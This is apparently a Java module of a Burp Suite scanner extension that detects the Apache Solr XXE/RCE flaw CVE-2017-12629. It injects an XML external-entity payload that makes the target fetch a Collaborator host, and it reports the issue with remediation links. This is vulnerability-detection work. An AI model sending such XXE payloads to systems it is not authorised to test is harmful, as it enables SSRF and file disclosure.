package burp.j2ee.issues.impl;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IScanIssue;
import burp.IScannerInsertionPoint;
import burp.IBurpCollaboratorClientContext;
import burp.IBurpCollaboratorInteraction;

import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;

import java.util.ArrayList;
import java.util.List;

/**
 * Several critical vulnerabilities discovered in Apache Solr (XXE & RCE)
 *
 * References: 
 *  - http://lucene.472066.n3.nabble.com/user/SendEmail.jtp?type=node&node=4358308&i=0
 *  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12629
 *
 */
public class ApacheSolrXXE implements IModule {

    private static final String TITLE = "Apache Solr XXE - RCE";
    private static final String DESCRIPTION = "J2EEscan detect a XML External Entities Injection vulnerability.<br />"
            + "The XML parsing library supports the use of custom entity references "
            + "in the XML document; custom entities "
            + "can be defined by including a user defined <pre>DOCTYPE</pre> that "
            + "reference an external resource to be included.<br /> "
            + "This option could be abused to carry on XXE attacks, leading "
            + "to <i>DoS</i> conditions, "
            + "local file include, internal LAN scanning and <i>SSRF</i> attacks. "
            + "<br /><br />"
            + "<b>References</b>:<br /><br />"
            + "http://lucene.472066.n3.nabble.com/user/SendEmail.jtp?type=node&node=4358308&i=0<br />"
            + "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-12629<br />"
            + "https://www.exploit-db.com/exploits/43009/";

    private static final String REMEDY = "It's reccomended to apply the security patch provided by the mantainer:<br />"
            + "https://issues.apache.org/jira/browse/SOLR-11482<br />" 
            + "https://issues.apache.org/jira/browse/SOLR-11477<br />" 
            + "https://wiki.apache.org/solr/SolrSecurity";

    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        IExtensionHelpers helpers = callbacks.getHelpers();
        List<IScanIssue> issues = new ArrayList<>();

        String xxesolr = "{!xmlparser v='<!DOCTYPE a SYSTEM \"http://%s/xxe\"><a></a>'}";

        // Collaborator context
        IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
        String currentCollaboratorPayload = collaboratorContext.generatePayload(true);

        String xxePayload = String.format(xxesolr, currentCollaboratorPayload);

        byte[] checkRequest = insertionPoint.buildRequest(xxePayload.getBytes());

        IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(
                baseRequestResponse.getHttpService(), checkRequest);

        // Poll Burp Collaborator for remote interaction
        List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

        if (!collaboratorInteractions.isEmpty()) {
            issues.add(new CustomScanIssue(
                    baseRequestResponse.getHttpService(),
                    helpers.analyzeRequest(baseRequestResponse).getUrl(),
                    checkRequestResponse,
                    TITLE,
                    DESCRIPTION,
                    REMEDY,
                    Risk.High,
                    Confidence.Certain));

            return issues;
        }

        return issues;
    }
}
